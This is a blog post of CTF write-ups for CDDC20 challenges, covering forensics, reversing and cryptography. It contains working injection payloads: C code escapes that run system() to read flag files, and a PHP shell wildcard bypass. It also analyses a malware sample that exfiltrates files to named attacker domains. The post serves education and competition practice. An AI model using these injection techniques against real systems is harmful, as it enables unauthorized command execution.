---
layout: post
title:  "CDDC20 Writeups WG3 - WG1"
author: Aaron Ti
date:   2020-07-05
category: CTF Writeups
abstract: CDDC20 Writeups WG3 - WG1. Consists of blood, sweat and tears from overguessing
---

## Sitemap

##### [Clickity Clack](#wg-3-1)
##### [My Favourite Music](#wg-3-2)
##### [Hello](#wg-3-3)
##### [BACK TO SCHOOL](#wg-3-4)
##### [Head-Rays](#wg-3-5)
##### [Wanna PK?](#wg-3-6)
##### [Spin](#wg-3-7)
##### [3-DCS](#wg-3-8)
##### [I Love Bach](#wg-3-9)
##### [BYWT2](#wg-2-1)
##### [EncryptSvc2](#wg-2-2)
##### [Find Their Wallet!](#wg-2-3)
##### [12-DCS](#wg-2-4)
##### [A Kind of Crypto](#wg-2-5)
##### [Overly Obsessed with Marvel](#wg-2-6)
##### [Firmware X-tract-or](#wg-1-1)

---

## Warp Gate 3

---

### <a name="wg-3-1"></a>Clickity Clack

![clickity clack]({{ site.baseurl }}/assets/img/CDDC20/Clickity_clack.png)

Sniffed.pcap contains USB traced packets for keyboard input

Extract keyboard input data using tshark, and run python script to convert bytes into readable keyboard character inputs using keyboard mapping

```python
#! /usr/bin/python3
newmap = {
2: "PostFail",
4: "a",
5: "b",
6: "c",
7: "d",
8: "e",
9: "f",
10: "g",
11: "h",
12: "i",
13: "j",
14: "k",
15: "l",
16: "m",
17: "n",
18: "o",
19: "p",
20: "q",
21: "r",
22: "s",
23: "t",
24: "u",
25: "v",
26: "w",
27: "x",
28: "y",
29: "z",
30: "1",
31: "2",
32: "3",
33: "4",
34: "5",
35: "6",
36: "7",
37: "8",
38: "9",
39: "0",
40: "Enter",
41: "esc",
42: "del",
43: "tab",
44: "space",
45: "-",
46: "=",
47: "[",
48: "]",
49: "\\",
50: "#",
51: ";",
52: "'",
54: ",",
55: ".",
56: "/",
57: "CapsLock",
79: "RightArrow",
80: "LetfArrow"
}
myKeys = open('hexoutput.txt')
i = 1
for line in myKeys:
	bytesArray = bytearray.fromhex(line.strip())
	for byte in bytesArray:
		if byte != 0:
			keyVal = int(byte)

	if keyVal in newmap:
		print(newmap[keyVal])
	i+=1
```

(POSTFAIL keyboard inputs can be inferred to be SHIFTUP and SHIFTDOWN inputs as they do not have any keyboard mapping)

Extracted keyboard input: IamSuperC0olAmiRiTe!

Filter for "frame.len > 100 && usb.dst == '1.9.2' && usb.transfer_type == 0x03", then extract and combine the 5th, 7th and 8th packets to obtain a locked zip file

Using the extracted keyboard input as the password, the zip file will be unlocked to obtain the flag

Flag: `CDDC20{YOU_AS_BEE_FUN}`

---

### <a name="wg-3-2"></a>My Favourite Music

![favourite music]({{ site.baseurl }}/assets/img/CDDC20/My_favourite_music.png)

Using python to compare the wav files, a secret code can be found

```python
import wave

f0 = wave.open('suspicious.wav', "rb")

nc0 = f0.getnchannels()
sw0 = f0.getsampwidth()
fps0 = f0.getframerate()
nf0 = f0.getnframes()

f1 = wave.open('original.wav', "rb")

nc1 = f1.getnchannels()
sw1 = f1.getsampwidth()
fps1 = f1.getframerate()
nf1 = f1.getnframes()

data0 = f0.readframes(nf0)
data1 = f1.readframes(nf1)
data0 = struct.unpack("<{}h".format(nf0*nc0), data0)
data1 = struct.unpack("<{}h".format(nf1*nc1), data1)

data0 = np.array(data0)
data1 = np.array(data1)

plt.figure(figsize=(20,5))
y = data0 - data1[:len(data0)]
y = y
plt.scatter(range(len(y)), y)
```

After differentiating the two wav files together, morse code can be plotted to visualize the difference in the sound waves, then convert to ASCII to obtain the flag

Flag: `CDDC20{MORSELSB}`

---

### <a name="wg-3-3"></a>Hello

![hello]({{ site.baseurl }}/assets/img/CDDC20/Hello.png)

The flag can be decrypted using AES ECB attack

(https://github.com/emilystamm/aes-ecb-attacks)

Flag: `CDDC20{r3ally_re4l1y_n1c3_t0_meet_y0u_fri3nd}`

---

### <a name="wg-3-4"></a>BACK TO SCHOOL

![bts]({{ site.baseurl }}/assets/img/CDDC20/Back_to_school.png)

Using ghidra to decompile the ELF binary BTS, the binary is found to use our inputs as part of its math equations

![inputs]({{ site.baseurl }}/assets/img/CDDC20/Files/BTS-1.png)

The quadratic equations and input conditions are calculated to be

```
a1x + b1y = c1
a2x + b2y = c2
c1 = 284
c2 = 164
x = 12, y = 5
```

according to the conditions as of below

![math parameters]({{ site.baseurl }}/assets/img/CDDC20/Files/BTS-2.png)

By achieving the specified conditions of `x = 12, y = 5`, calculated for an integer solution, the flag will be outputted

Flag: `CDDC20{MATHSOLVER}`

---

### <a name="wg-3-5"></a>Head-Rays

![head-rays]({{ site.baseurl }}/assets/img/CDDC20/Head-Rays.png)

```
; Function:        0
; Defined at line: 0
; #Upvalues:       0
; #Parameters:     0
; Is_vararg:       2
; Max Stack Size:  34

    0 [-]: CLOSURE   R0 0         ; R0 := closure(Function #0_0)
    1 [-]: CLOSURE   R1 1         ; R1 := closure(Function #0_1)
    2 [-]: NEWTABLE  R2 24 0      ; R2 := {} (size = 24,0)
    3 [-]: LOADK     R3 K1        ; R3 := 69
    4 [-]: LOADK     R4 K2        ; R4 := 66
    5 [-]: LOADK     R5 K2        ; R5 := 66
    6 [-]: LOADK     R6 K1        ; R6 := 69
    7 [-]: LOADK     R7 K3        ; R7 := 52
    8 [-]: LOADK     R8 K4        ; R8 := 54
    9 [-]: LOADK     R9 K5        ; R9 := 125
   10 [-]: LOADK     R10 K6       ; R10 := 84
   11 [-]: LOADK     R11 K7       ; R11 := 99
   12 [-]: LOADK     R12 K8       ; R12 := 112
   13 [-]: LOADK     R13 K7       ; R13 := 99
   14 [-]: LOADK     R14 K9       ; R14 := 116
   15 [-]: LOADK     R15 K10      ; R15 := 117
   16 [-]: LOADK     R16 K11      ; R16 := 55
   17 [-]: LOADK     R17 K12      ; R17 := 104
   18 [-]: LOADK     R18 K13      ; R18 := 97
   19 [-]: LOADK     R19 K14      ; R19 := 89
   20 [-]: LOADK     R20 K15      ; R20 := 74
   21 [-]: LOADK     R21 K16      ; R21 := 115
   22 [-]: LOADK     R22 K17      ; R22 := 103
   23 [-]: LOADK     R23 K14      ; R23 := 89
   24 [-]: LOADK     R24 K17      ; R24 := 103
   25 [-]: LOADK     R25 K10      ; R25 := 117
   26 [-]: LOADK     R26 K10      ; R26 := 117
   27 [-]: LOADK     R27 K7       ; R27 := 99
   28 [-]: LOADK     R28 K18      ; R28 := 107
   29 [-]: LOADK     R29 K19      ; R29 := 100
   30 [-]: LOADK     R30 K20      ; R30 := 106
   31 [-]: LOADK     R31 K21      ; R31 := 127
   32 [-]: LOADK     R32 K22      ; R32 := 39
   33 [-]: LOADK     R33 K23      ; R33 := 123
   34 [-]: SETLIST   R2 31 1      ; R2[0] to R2[30] := R3 to R33 ; R(a)[(c-1)*FPF+i] := R(a+i), 1 <= i <= b, a=2, b=31, c=1, FPF=50
   35 [-]: SETGLOBAL R2 K0        ; a := R2
   36 [-]: LOADK     R2 K24       ; R2 := 1
   37 [-]: GETGLOBAL R3 K0        ; R3 := a
   38 [-]: LEN       R3 R3        ; R3 := #R3
   39 [-]: LOADK     R4 K24       ; R4 := 1
   40 [-]: FORPREP   R2 9         ; R2 -= R4; pc += 9 (goto 50)
   41 [-]: GETGLOBAL R6 K0        ; R6 := a
   42 [-]: GETGLOBAL R7 K25       ; R7 := string
   43 [-]: GETTABLE  R7 R7 K26    ; R7 := R7["char"]
   44 [-]: MOVE      R8 R0        ; R8 := R0
   45 [-]: GETGLOBAL R9 K0        ; R9 := a
   46 [-]: GETTABLE  R9 R9 R5     ; R9 := R9[R5]
   47 [-]: CALL      R8 2 0       ; R8 to top := R8(R9)
   48 [-]: CALL      R7 0 2       ; R7 := R7(R8 to top)
   49 [-]: SETTABLE  R6 R5 R7     ; R6[R5] := R7
   50 [-]: FORLOOP   R2 -10       ; R2 += R4; if R2 <= R3 then R5 := R2; PC += -10 , goto 41 end
   51 [-]: GETGLOBAL R2 K27       ; R2 := table
   52 [-]: GETTABLE  R2 R2 K28    ; R2 := R2["concat"]
   53 [-]: GETGLOBAL R3 K0        ; R3 := a
   54 [-]: LOADK     R4 K29       ; R4 := ""
   55 [-]: CALL      R2 3 2       ; R2 := R2(R3 to R4)
   56 [-]: MOVE      R3 R1        ; R3 := R1
   57 [-]: MOVE      R4 R2        ; R4 := R2
   58 [-]: CALL      R3 2 2       ; R3 := R3(R4)
   59 [-]: MOVE      R2 R3        ; R2 := R3
   60 [-]: GETGLOBAL R3 K30       ; R3 := print
   61 [-]: MOVE      R4 R2        ; R4 := R2
   62 [-]: CALL      R3 2 1       ;  := R3(R4)
   63 [-]: RETURN    R0 1         ; return 


; Function:        0_0
; Defined at line: 2
; #Upvalues:       0
; #Parameters:     1
; Is_vararg:       0
; Max Stack Size:  7

    0 [-]: LOADK     R1 K1        ; R1 := 6
    1 [-]: SETGLOBAL R1 K0        ; b := R1
    2 [-]: LOADK     R1 K2        ; R1 := 1
    3 [-]: LOADK     R2 K3        ; R2 := 0
    4 [-]: LT        0 K3 R0      ; if 0 < R0 then goto 6 else goto 24
    5 [-]: JMP       18           ; PC += 18 (goto 24)
    6 [-]: GETGLOBAL R3 K0        ; R3 := b
    7 [-]: LT        0 K3 R3      ; if 0 < R3 then goto 9 else goto 24
    8 [-]: JMP       15           ; PC += 15 (goto 24)
    9 [-]: MOD       R3 R0 K4     ; R3 := R0 % 2
   10 [-]: GETGLOBAL R4 K0        ; R4 := b
   11 [-]: MOD       R4 R4 K4     ; R4 := R4 % 2
   12 [-]: EQ        1 R3 R4      ; if R3 ~= R4 then goto 14 else goto 15
   13 [-]: JMP       1            ; PC += 1 (goto 15)
   14 [-]: ADD       R2 R2 R1     ; R2 := R2 + R1
   15 [-]: SUB       R5 R0 R3     ; R5 := R0 - R3
   16 [-]: DIV       R5 R5 K4     ; R5 := R5 / 2
   17 [-]: GETGLOBAL R6 K0        ; R6 := b
   18 [-]: SUB       R6 R6 R4     ; R6 := R6 - R4
   19 [-]: DIV       R6 R6 K4     ; R6 := R6 / 2
   20 [-]: MUL       R1 R1 K4     ; R1 := R1 * 2
   21 [-]: SETGLOBAL R6 K0        ; b := R6
   22 [-]: MOVE      R0 R5        ; R0 := R5
   23 [-]: JMP       -20          ; PC += -20 (goto 4)
   24 [-]: GETGLOBAL R3 K0        ; R3 := b
   25 [-]: LT        0 R0 R3      ; if R0 < R3 then goto 27 else goto 28
   26 [-]: JMP       1            ; PC += 1 (goto 28)
   27 [-]: GETGLOBAL R0 K0        ; R0 := b
   28 [-]: LT        0 K3 R0      ; if 0 < R0 then goto 30 else goto 39
   29 [-]: JMP       9            ; PC += 9 (goto 39)
   30 [-]: MOD       R3 R0 K4     ; R3 := R0 % 2
   31 [-]: LT        0 K3 R3      ; if 0 < R3 then goto 33 else goto 34
   32 [-]: JMP       1            ; PC += 1 (goto 34)
   33 [-]: ADD       R2 R2 R1     ; R2 := R2 + R1
   34 [-]: SUB       R4 R0 R3     ; R4 := R0 - R3
   35 [-]: DIV       R4 R4 K4     ; R4 := R4 / 2
   36 [-]: MUL       R1 R1 K4     ; R1 := R1 * 2
   37 [-]: MOVE      R0 R4        ; R0 := R4
   38 [-]: JMP       -11          ; PC += -11 (goto 28)
   39 [-]: RETURN    R2 2         ; return R2
   40 [-]: RETURN    R0 1         ; return 


; Function:        0_1
; Defined at line: 19
; #Upvalues:       0
; #Parameters:     1
; Is_vararg:       0
; Max Stack Size:  6

    0 [-]: GETGLOBAL R1 K0        ; R1 := string
    1 [-]: GETTABLE  R1 R1 K1     ; R1 := R1["gsub"]
    2 [-]: MOVE      R2 R0        ; R2 := R0
    3 [-]: LOADK     R3 K2        ; R3 := "i"
    4 [-]: LOADK     R4 K3        ; R4 := "1"
    5 [-]: LOADK     R5 K4        ; R5 := 2
    6 [-]: CALL      R1 5 2       ; R1 := R1(R2 to R5)
    7 [-]: MOVE      R0 R1        ; R0 := R1
    8 [-]: GETGLOBAL R1 K0        ; R1 := string
    9 [-]: GETTABLE  R1 R1 K1     ; R1 := R1["gsub"]
   10 [-]: MOVE      R2 R0        ; R2 := R0
   11 [-]: LOADK     R3 K5        ; R3 := "a"
   12 [-]: LOADK     R4 K6        ; R4 := "4"
   13 [-]: LOADK     R5 K7        ; R5 := 1
   14 [-]: CALL      R1 5 2       ; R1 := R1(R2 to R5)
   15 [-]: MOVE      R0 R1        ; R0 := R1
   16 [-]: GETGLOBAL R1 K0        ; R1 := string
   17 [-]: GETTABLE  R1 R1 K1     ; R1 := R1["gsub"]
   18 [-]: MOVE      R2 R0        ; R2 := R0
   19 [-]: LOADK     R3 K8        ; R3 := "e"
   20 [-]: LOADK     R4 K9        ; R4 := "3"
   21 [-]: LOADK     R5 K4        ; R5 := 2
   22 [-]: CALL      R1 5 2       ; R1 := R1(R2 to R5)
   23 [-]: MOVE      R0 R1        ; R0 := R1
   24 [-]: RETURN    R0 2         ; return R0
   25 [-]: RETURN    R0 1         ; return 
```

Legit just reverse the LUA bytecode, using the online reference (https://the-ravi-programming-language.readthedocs.io/en/latest/lua_bytecode_reference.html)

Flag: `CDDC20{R3v3rs1ng_Lu4_assembly!}`

---

### <a name="wg-3-6"></a>Wanna PK?

![wanna pk]({{ site.baseurl }}/assets/img/CDDC20/Wanna_pk.png)

Zip file has a corrupted central directory, causing the `unzip -e` to give only 4 files

By writing `zip -FF How_can_I_fight -o repaired.zip`, the repaired.zip will contain all the original files, which can be rearranged and combined between the START>> and <<END bytes to form a PNG file, obtaining the final flag

![recombined img]({{ site.baseurl }}/assets/img/CDDC20/Files/PK.png)

Flag: `CDDC20{Take_my_hand_my_friend!}`

---

### <a name="wg-3-7"></a>Spin

![spin]({{ site.baseurl }}/assets/img/CDDC20/Spin.png)

Using IDApro to disassemble the executable, the executable is found to be encoded using VMProtect

As the executable runs within a mini VM when run, the best way to reverse such a toxic encryption is to debug it on runtime

Using the IDApro inbuilt debugger, the executable runs a decryption function on runtime and saves the flag as a string in the stack

As such, when the string is completely decoded, we are able to see the plaintext string in an allocated address of the executable

![string]({{ site.baseurl }}/assets/img/CDDC20/Files/spin.png)

Flag: `CDDC20{spin-1-2-3-4-5-6-7-8-9-0-@_@}`

---

### <a name="wg-3-8"></a>3-DCS

![3-DCS]({{ site.baseurl }}/assets/img/CDDC20/3-DCS.png)

```python
def check(code):
    if len(code) > 2000:
        print "Code size is {}! Too long!".format(len(code))
        sys.exit(-1)
    elif len(code) < 20:
        print "Really? Are you kidding me?"
        sys.exit(-1)
    else:
        ch = 'Z'
        if ch in code : 
            bye(ch)
```

```python
def handshaking(c_code, rounds=3) : 
    c_code = 'char*d="' + c_code 
    c_code +='''",o[3217];
int t=640,i,r,w,f,b,p,x;n(){return r<t?d[(*d+100+(r++))%t]:r>+1340?59:(x=d[(r++-t)%351+t]
)?x^(p?6:0):(p=+34);}main(){w=sprintf(o,"char*d=");r=p=0;for(f=1;f<*d+100;)if((b=d[f++])-33){
if(b<+93){if(!p)o[w++]=34;for(i=35+(p?0:1);i<b;i++)o[w++]=n();o[w++]=p?n():+34;}
else for(i=92;i<b;i++)o[w++]=32;}else o[w++]=10;o[w]=0;puts(o);};/*cddc_ctf*/;'''
    round_result = []
    for i in range(rounds) : 
        c_code = compile_and_run(c_code) 
        round_result.append(c_code)

    return round_result 
```

By inputting our payload, the code prepends it with `char*d="`, which is vulnerable to a simple string escape

As our input is parsed to detect `"` within the first 30 characters, add a 30 character padding then escape the string

After escaping the string, we can write our own code to run as the C Quine, commenting out their appended code

By using puts, then consecutive main, the quine can be setup easily

Payload:
```c
123456789012345678901234567890"; int main() {puts("int main() {puts(\"int main() {system(\\\"cat flag.txt\\\");}\");}");}/*
```

Flag: `CDDC20{!!Inspired_by_Don_Yang!!}`

---

### <a name="wg-3-9"></a>I Love Bach

![bach]({{ site.baseurl }}/assets/img/CDDC20/I_love_bach.png)

The filename BMV1080 highly suggests the Art of Fugue written by Bach, where Fugue is an esoteric language which hides data in music notes

There exists a docker for fugue, which we will use to decode the mid file

```
> docker run -it --rm -v "$PWD":/code esolang/fugue bash
> fugue /code/BMV1080.mid
Hello Nikita
```

Flag: `CDDC20{Hello_Nikita}`

---

## Warp Gate 2

---

### <a name="wg-2-1"></a>BYWT2

![bywt2]({{ site.baseurl }}/assets/img/CDDC20/BYWT2.png)

The php file uses the highlight_file function to give us info on how it parses our GET request

We have to parse in an array using the $_GET['file'] as our request, where each element in the array is joined with a space via their implode function

Our request is parsed for presence of special characters and alphanumerical characters, where only certain characters are accepted such as `A,H,T,X`, and certain special characters

If our input is accepted, it is run as `"cat ".implode($_GET['input'])`, where the output will be appended onto the highlight_file, which is a LFI vulnerability

Initially, we approached this problem to find a way to `ls`, by retrieving the echo command by using `?` to replace the unaccepted characters

```
Initial payload url:
https://(domain)/?file[]=/&file[]=/???/???/??h?&file[]=/???/*

equivalent to

shell_exec("cat / /usr/bin/echo /???/*")
```

After finding out the flag file can be retrieved in the subdirectory `*/*`, where the flag file is too long to use `?`, we could've just used the cat function they provided instead of wasting our time locating the echo binary

```
Final payload url:
https://(domain)/?file[]=*/*

equivalent to

shell_exec("cat */*")
```

Flag: `I forgot what was the flag`

---

### <a name="wg-2-2"></a>EncryptSvc2

![encryptsvc2]({{ site.baseurl }}/assets/img/CDDC20/EncryptSvc2.png)

The file provided is an ELF binary, where our inputs are used to decipher a flag remotely

Running the binary prints out a service menu, where our input is parsed to choose whether we show example, encrypting a message, decrypting a message, show the public key, or quit

![menu]({{ site.baseurl }}/assets/img/CDDC20/Files/EncryptSvc2-1.png)

After trying out the edge cases to this first input parsing, it is found to work on inputting `7` twice, instead of the required range `1 to 5`

When the binary encrypts the message after inputting `7` twice, the encrypted text is changed as shown below 

![select]({{ site.baseurl }}/assets/img/CDDC20/Files/EncryptSvc2-2.png)

After reversing the binary further, the change in message encryption was due to the change in exponent used in its RSA encryption

```C
do {
    inputOption = getInput();
    switch(inputOption) {
    default:
        puts("Please select 1-5 \n");
        break;
    case 1:
        encFlagSize = encryptPublic(flagBuffer,0x80,publicPemBuffer,encDestBuffer);
        if (encFlagSize == 0xffffffff) {
        FUN_001014ca("[-] Public Encrypt failed ");
                    /* WARNING: Subroutine does not return */
        exit(-1);
        }
        puts("[Encrypted message example] ----------------------------------------|");
        printf("[+] Encrypted length : %d\n",(ulong)encFlagSize);
        b64EncodedCiphertext = (void *)b64encode(encDestBuffer,(ulong)encFlagSize,(ulong)encFlagSize);
        printf("[+] Encrypted Text : \n%s",b64EncodedCiphertext);
        free(b64EncodedCiphertext);
        puts("\n--------------------------------------------------------------------|\n");
        break;
    case 2:
        ...
    case 3:
        ...
    case 4:
        ...
    case 5:
        ...
    case 7:
        FUN_00101627((ulong)inputOption);
    }
} while( true );

void FUN_00101627(int param_1)
{
  ***(long ***)(g_RSAPublicBio + 0x28) = (long)param_1;
  return;
}
```

The initial encrypted message is encrypted using an exponent of 65537, while inputting `7` twice will change this exponent to 7

As `gcd(65537, 7) == 1`, we can use the common modulus attack to decrypt the flag

```
Initial encrypted message:
mXKqtThcqYFxcx1FeDBtgsjfkeBdMN3VV4GUHH5lXCWsMDjLPlZXhV/N28InCiLd
EfN6G5QZ+HjEJ2PBevygDnV9tTeL5F3izvyowatLpfIHRvmjSZwbHiq/dHdkm3A4
rFcIAuKfsIoTMkuCwt9JdPNWVbIPRe+vbZRnDnUnX1g=

Encrypted message after inputting 7 twice:
0rGwj2Wcg5qpQ5+p6d1QJPpgbYCxgHqmgd/BZOfjP4k2uifOPzsvWGnBezH1f/Hl
4q7eb9g6ZU8ISEE/oNkitkTRp78I7I5oKZpk3cLgIJP2kLRH9OPdH+H+4BG7bcv1
Iuiw/1h5V0OY3QQPG1Ud4IIHU/Jk0M109+Po42QIZmw=

(These two outputs are not from the actual flag)
```

There exists some `s1` and `s2`, where `e1 . s1 + e2 . s2 == 1`

![stackoverflow]({{ site.baseurl }}/assets/img/CDDC20/Files/EncryptSvc2-3.png)

As shown above, by solving for `65537 . s1 + 7 . s2 = 1`, we can obtain the flag by multiplying the ciphertexts with their respective exponents

Flag: `CDDC20{RSA_and_euclidean_fun}`

---

### <a name="wg-2-3"></a>Find Their Wallet!

![find wallet]({{ site.baseurl }}/assets/img/CDDC20/Find_their_wallet.png)

This was the last challenge that we were stuck on, leading us to reverse the whole forensics process, when the answer was in our face the entire time

One of the files is a pcap file, which we are able to export HTTP file requests from

![user agent]({{ site.baseurl }}/assets/img/CDDC20/Files/address-1.png)

Midway during the packet capture, the HTTP requests have its User-Agent as a Microsoft Word Document, which is abnormal, suggesting a Macros has maliciously accessed a domain to retrieve data

The other docx file given contains the said Macros, which is extracted to be the xml as of below

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
        <Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
        Target="http://cuori.appassi0nati.com/favicon.jpg"
        TargetMode="External"/>
    </Relationships>
```

The jpg file as shown above is a word document that was retrieved by the Macros, which attaches favicon.png, then is further retrieved in the later HTTP requests

![favicon cert]({{ site.baseurl }}/assets/img/CDDC20/Files/address-2.png)

The favicon.png file as shown above is actually a OpenSSL certificate, where after we decode it with `openssl base64 -d -in favicon.png -out favicon.exe`, is found to be a PE32 Windows executable

The packet capture traced these files, to be downloaded from cuori.appassi0nati.com and uploaded data to calmi.appassi0nati.com

After reversing the PE32 executable, it is found to be made using Golang, which looks for *.docx & the UTC-- & *.pdf. It then base64 encodes these files and decrypts a string to XOR them with. After XORing with the string `risk_comes_from_not_knowing_what_you're_doing`, the encoded files are wrapped with a HTTP POST request to upload into the domain as said above

In the packet capture, the second upload file is as such

```
--b0b800354db3d2a0243a1d1bdc089d4bd20f1f2475cb0460608e32ca3f8a
Content-Disposition: form-data; name="file"; filename="VVRDLS0yMDIwLTA1LTI0VDE1LTQ4LTA4LjMwOVotLWJjMGEyM2NmMzYyODYzZDg0MWUyY2YxNzcyMmVlN2Y3YWRkODY1OWU="
Content-Type: application/octet-stream
    .
    .
    .
--b0b800354db3d2a0243a1d1bdc089d4bd20f1f2475cb0460608e32ca3f8a--
```

The filename written is base64 encoded, which decodes into `UTC--2020-05-24T15-48-08.309Z--bc0a23cf362863d841e2cf17722ee7f7add8659e`, which looks like the correct file to decrypt to obtain the wallet address, given its timestamp format in its title

After running the script to XOR it with the above string, the result is the base64 encoded string of a JSON

```python
s = "risk_comes_from_not_knowing_what_you're_doing"
with open('upload_stripped', 'rb') as f:
    data = f.read()
with open('upload_decrypted', 'wb') as g:
    for i in range(len(data)):
        g.write(chr(data[i] ^ ord(s[i % len(s)])).encode('utf-8'))
```
```json
{
    "version":3,
    "id":"2d232249-07c7-453b-b2db-a636ff952c88",
    "address":"bc0a23cf362863d841e2cf17722ee7f7add8659e",
    "crypto":
    {
        "ciphertext":"3fbbf4573b08192a7567a74677864dd10a8536138607a7952ab816e718b78188",
        "cipherparams":
        {
            "iv":"d624c76ef63d15515bf876a22c378745"
        },
        "cipher":"aes-128-ctr",
        "kdf":"scrypt",
        "kdfparams":
        {
            "dklen":32,"salt":"020dbc4741a6fc7e99afc06fd76d4ce38d9e8982f89f51c94ae9d16273f509f8",
            "n":131072,
            "r":8,
            "p":1
        },"mac":"ca8ad1b7bcf907892c18851a10be278f5a8b7611e56c0776607c93983dce2d9e"
    }
}
```

The JSON shows a wallet address that is exactly identical to the one decrypted in the title?! After further searching of the wallet address format, we found out that the address starts with a prepending `0x`

The base64 decoded title was right in our face the entire time, unrequiring of finding out the whole process in the first place *facepalms*

Flag: `CDDC20{0XBC0A23CF362863D841E2CF17722EE7F7ADD8659E}`

---

### <a name="wg-2-4"></a>12-DCS

![12-DCS]({{ site.baseurl }}/assets/img/CDDC20/12-DCS.png)

```python
def check(code):
    if len(code) > 2000:
        print "Code size is {}! Too long!".format(len(code))
        sys.exit(-1)
    elif len(code) < 20:
        print "Really? Are you kidding me?"
        sys.exit(-1)
    else:
        bad = ['Z', "main", "class", "attribute", "exit"] 
        for ch in bad : 
            if ch in code : 
                bye(ch)

        ch = '"' 
        if ch in code[:130] : 
            bye(ch)
```

```python
def handshaking(c_code, rounds=3) : 
    c_code = 'char*d="' + c_code 
    c_code +='''",o[3217];
int t=640,i,r,w,f,b,p,x;n(){return r<t?d[(*d+100+(r++))%t]:r>+1340?59:(x=d[(r++-t)%351+t]
)?x^(p?6:0):(p=+34);}main(){w=sprintf(o,"char*d=");r=p=0;for(f=1;f<*d+100;)if((b=d[f++])-33){
if(b<+93){if(!p)o[w++]=34;for(i=35+(p?0:1);i<b;i++)o[w++]=n();o[w++]=p?n():+34;}
else for(i=92;i<b;i++)o[w++]=32;}else o[w++]=10;o[w]=0;puts(o);};/*cddc_ctf*/;'''
    round_result = []
    for i in range(rounds) : 
        c_code = compile_and_run(c_code) 
        round_result.append(c_code)

    return round_result
```

This time, the C Quine is run 12 times, with a maximum code size of 2000. Bad characters and words are also parsed, including main which is essential to run consecutively

By performing the same string escape as before after 130 characters this time, we also can escape the quine by making use of a readfile

After hijacking puts like before, we escape the bad word parsing of main by writing `ma""in` into a file, which will discard the `"`. The Quine is escaped by making use of `>` in linux cli, then readfile in C

Payload:
```c
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890"; int puts(int a){ system("echo 'int ma""in(){system(\"cat test\");}/*' > test; cat flag.txt >> test; echo '*/' >> test; cat test "); }; char o[3217];//
```

Flag: `CDDC20{@@Three_Multiplied_By_Four_Is_Twelve!!}`

---

### <a name="wg-2-5"></a>A Kind of Crypto

![kind of crypto]({{ site.baseurl }}/assets/img/CDDC20/A_kind_of_crypto.png)

```python
def mulInv(n, q):  
    return extEuclid(n, q)[0] % q

def extEuclid(a, b):
    s0, s1, t0, t1 = 1, 0, 0, 1
    while b > 0:
        q, r = divmod(a, b)
        a, b = b, r
        s0, s1, t0, t1 = s1, s0 - q * s1, t1, t0 - q * t1
        pass
    return s0, t0, a

def sqrRoot(n, q):
    r = pow(n,(q+1)/4,q)
    return r, q - r

Point = collections.namedtuple("Point", ["x", "y"])

class EC(object):
    def __init__(self, a, b, q):
        assert 0 < a and a < q and 0 < b and b < q and q > 2
        assert (4 * (a ** 3) + 27 * (b ** 2))  % q != 0
        self.a = a
        self.b = b
        self.q = q
        self.zero = Point(0, 0)
        pass

    def isOn(self, p):
        if p == self.zero: return True
        l = (p.y ** 2) % self.q
        r = ((p.x ** 3) + self.a * p.x + self.b) % self.q
        return l == r

    def findY(self, x):
        y2 = (x ** 3 + self.a * x + self.b) % self.q
        y, my = sqrRoot(y2, self.q)
        return y2 == y*y%self.q, y

    def negation(self, p):
        return Point(p.x, -p.y % self.q)

    def addition(self, p1, p2):
        if p1 == self.zero: return p2
        if p2 == self.zero: return p1
        if p1.x == p2.x and (p1.y != p2.y or p1.y == 0):
            return self.zero
        if p1.x == p2.x:
            l = (3 * p1.x * p1.x + self.a) * mulInv(2 * p1.y, self.q) % self.q
            pass
        else:
            l = (p2.y - p1.y) * mulInv(p2.x - p1.x, self.q) % self.q
            pass
        x = (l * l - p1.x - p2.x) % self.q
        y = (l * (p1.x - x) - p1.y) % self.q
        return Point(x, y)

    def smul(self, p, n):
        r = self.zero
        m2 = p
        while 0 < n:
            if n & 1 == 1:
                r = self.addition(r, m2)
                pass
            n, m2 = n >> 1, self.addition(m2, m2)
            pass
        return r

    def random(self, xin):
        while True:
            if xin == 0 :
                x = random.randint(1,self.q)
            else :
                x = xin
            y2 = (x ** 3 + self.a * x + self.b) % self.q
            if pow(y2,(self.q-1)/2,self.q) != 1 :
                continue
            y, my = sqrRoot(y2, self.q)
            return Point(x, y)

class STREAM():
    def __init__(self, ec, seed, P, Q):
        self.ec = ec
        self.seed = seed
        self.P = P
        self.Q = Q

    def genStream(self):
        t = self.seed
        s = (self.ec.smul(self.P,t)).x
        self.seed = s
        #print("s*Q.x",hex(self.ec.smul(self.Q,s).x))
        r = (self.ec.smul(self.Q,s)).x
        return r & (2**(8 * 30) - 1)  # return 30 bytes

    def encryption(self, pt):
        loop = (len(pt)+29)/30
        ct = bytearray('')
        for i in range(0,loop):
            r = self.genStream()
            #print("r=",hex(r))
            blkLen = len(pt[30*i:30*(i+1)])
            for j in range(1,blkLen+1):
                ct += chr(((r>>((30-j)*8))&0xff)^pt[30*i+j-1])
        return ct

    def decryption(self, pt):
        return self.encryption(pt)

pt ='This is an example message to be encrypted.'
    
stream = STREAM(ec,0xffffffffffffffff,P,Q);
ct = stream.encryption(bytearray(pt))
print("ct:",bytes(ct).encode('hex'))

stream = STREAM(ec,0xffffffffffffffff,P,Q);
pt = stream.decryption(ct)
print("pt:",pt)
```

We used [ECDSA](https://github.com/qubd/mini_ecdsa) in Python, [scryptoslib](https://github.com/scryptos/scryptoslib), and [ecpy](https://github.com/elliptic-shiho/ecpy)

There are two points `Q` and `P` defined on a Elliptic Curve `E`. From a seed `s`, it computes `r = sQ` and a new seed `sP` to be used in the next iteration. The sequence of `r`s generated are used to encrypt the plaintext by bit-wise xoring. However, each time only the `30 * 8` LSB of `r` are used to decrypt a 30 byte chunk of plaintext each time. `partial_plaintext.txt` hence contain plaintext of the 7th chunk and the first 3 bytes of the 8th chunk

We can recover `r` from `partial_plaintext.txt` with ease simply by bit-wise xoring. However, there are 16 bits of `r` that seem to be lost during the encryption process. Fortunately `2**16 = 65536` is a pretty small number to bruteforce so we can recover the whole `r` no problem

